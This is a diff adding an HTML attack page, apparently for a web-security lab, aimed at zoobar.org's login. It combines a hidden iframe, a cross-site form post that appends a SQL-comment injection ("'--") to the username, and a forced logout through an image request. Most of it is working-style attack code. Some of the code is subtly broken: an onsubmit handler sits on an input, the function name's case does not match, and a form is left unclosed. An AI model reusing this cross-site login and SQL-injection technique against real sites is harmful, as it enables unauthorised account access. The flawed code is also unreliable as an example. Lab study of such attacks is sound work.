@@ -1,0 +1,32 @@
+<html>
+<head>
+</head>
+<body>
+	<iframe id="frame1" name="frame1" style="visibility: hidden"></iframe>
+	<form id="attack" method="POST" target="frame1" name="loginform" action="http://zoobar.org/index.php">
+		<input id="username" type="text" name="login_username" size=25 autocomplete=no value=>
+		<input type="submit" onsubmit="register" name="submit_registration" value="Register">
+		<input type=submit style="visibility: hidden" name=submit_login value="Log in">
+	</form>
+	<script>
+		function Register() {
+			document.getElementById('username').value = document.getElementById('username').value + "'--";
+			return true;
+		}
+
+		window.onload = function() {
+			var frame1 = document.getElementById('frame1');			
+			counter1 = 0;
+			frame1.onload = function() {
+				counter1++;
+				if(counter1 >= 2) {
+					new Image().src='http://zoobar.org/index.php?action=logout';
+					//setTimeout(function() {}, 100);
+
+				}
+			};
+		};
+	</script>
+	<form name=loginform method=POST action="/index.php">
+</body>
+</html>
